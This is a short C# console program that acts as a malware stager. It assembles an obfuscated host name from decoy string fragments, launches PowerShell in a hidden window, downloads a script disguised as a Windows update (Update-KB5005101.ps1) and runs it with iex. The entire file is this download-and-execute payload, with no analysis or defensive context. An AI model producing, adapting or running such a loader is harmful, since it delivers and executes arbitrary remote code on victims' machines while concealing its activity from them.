using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var MyProxyServe = @":8087";
           var IndiaSailing = @"Colombo";
           var WarriorShepa = @"Viriato";
           var TerminalPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
           var FdxEstaMerda = @"HenrryTheNavigator";

           Process process = new Process();
           process.StartInfo.FileName = TerminalPath;
           process.StartInfo.Arguments = "$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://"+WarriorShepa+IndiaSailing+FdxEstaMerda+MyProxyServe+"/Update-KB5005101.ps1',$false);$h.send();iex $h.responseText";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}